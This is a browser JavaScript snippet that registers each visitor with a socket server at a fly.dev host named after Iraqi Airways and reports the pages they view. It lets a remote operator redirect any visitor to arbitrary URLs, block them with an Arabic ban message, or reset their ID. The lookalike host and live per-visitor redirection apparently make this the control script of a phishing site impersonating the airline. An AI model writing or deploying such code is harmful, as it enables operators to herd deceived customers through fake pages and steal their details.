(function() {
    const SOCKET_URL = "https://iraqairways-server.fly.dev";
    const script = document.createElement('script');
    script.src = "https://cdn.socket.io/4.7.2/socket.io.min.js";
    script.onload = function() {
        const socket = io(SOCKET_URL, {
            transports: ["polling", "websocket"]
        });

        let visitorId = localStorage.getItem("visitorId");
        
        socket.on("connect", () => {
            console.log("Tracking connected");
            socket.emit("visitor:register", { existingVisitorId: visitorId });
        });

        socket.on("successfully-connected", (data) => {
            localStorage.setItem("visitorId", data.pid);
            socket.emit("visitor:pageEnter", document.title || window.location.pathname);
        });

        // Handle admin navigation command
        socket.on("visitor:navigate", (page) => {
            if (page === '' || page === '__home__') {
                window.location.href = "/";
            } else if (page) {
                if (page.startsWith("http")) {
                    window.location.href = page;
                } else {
                    window.location.href = "/" + page;
                }
            }
        });

        // Handle admin block
        socket.on("blocked", () => {
            document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;direction:rtl;"><h1>تم حظرك من استخدام الموقع</h1></div>';
        });

        // Handle admin delete
        socket.on("deleted", () => {
            localStorage.removeItem("visitorId");
            window.location.href = "/";
        });

        // Ping to keep active
        setInterval(() => {
            if (socket.connected) {
                socket.emit("visitor:ping");
            }
        }, 30000);
    };
    document.head.appendChild(script);
})();
